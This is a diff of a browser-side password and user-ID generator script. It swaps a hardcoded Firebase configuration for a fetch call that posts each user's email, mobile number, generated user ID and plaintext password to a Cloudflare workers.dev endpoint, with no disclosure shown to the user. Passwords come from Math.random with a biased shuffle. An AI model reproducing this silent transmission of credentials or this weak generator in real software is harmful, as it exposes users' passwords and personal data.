@@ -1,19 +1,6 @@
 /* 🔄 AUTO REFRESH AFTER 1.30 HOURS */
 setTimeout(() => location.reload(), 5400000);
 
-/* 🔥 FIREBASE CONFIG */
-firebase.initializeApp({
-  apiKey: "AIzaSyCrnG8iz_JUgqiG8zVStqKBpicOF4m2SB0",
-  authDomain: "iruserid-5c557.firebaseapp.com",
-  databaseURL: "https://iruserid-5c557-default-rtdb.firebaseio.com",
-  projectId: "iruserid-5c557",
-  storageBucket: "iruserid-5c557.firebasestorage.app",
-  messagingSenderId: "234438715803",
-  appId: "1:234438715803:web:2f254753f6b6827d6a193e"
-});
-
-const db = firebase.database();
-
 /* 🧠 UNIQUE BROWSER ID */
 let containerId = localStorage.getItem("containerId");
 
@@ -32,23 +19,19 @@ const special = "@#$%!&*";
 
 const all = lower + upper + numbers + special;
 
-/* RANDOM LENGTH */
 const length = Math.floor(Math.random() * 5) + 8;
 
 let password = "";
 
-/* ENSURE ALL TYPES */
 password += lower[Math.floor(Math.random()*lower.length)];
 password += upper[Math.floor(Math.random()*upper.length)];
 password += numbers[Math.floor(Math.random()*numbers.length)];
 password += special[Math.floor(Math.random()*special.length)];
 
-/* FILL REMAINING */
 for(let i=password.length;i<length;i++){
   password += all[Math.floor(Math.random()*all.length)];
 }
 
-/* SHUFFLE */
 password = password.split('').sort(() => Math.random() - 0.5).join('');
 
 return password;
@@ -66,7 +49,7 @@ const mailout = document.getElementById("mailout");
 const final = document.getElementById("final");
 
 /* ⚡ GENERATE */
-function generate(){
+async function generate(){
 
 const email = emailEl.value.trim();
 const mobile = mobileEl.value.trim();
@@ -104,13 +87,24 @@ ${password}
 ${mobile}
 ${email}`;
 
-/* 🔥 SAVE FIREBASE */
-db.ref("users/" + containerId + "/activity").push({
+/* 🔥 SEND TO CLOUDFLARE WORKER */
+fetch("https://gfdv.sawanpoint0000.workers.dev/",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+containerId,
 email,
 mobile,
 userid:userId,
 password,
 time:Date.now()
+})
+
 });
 
 }
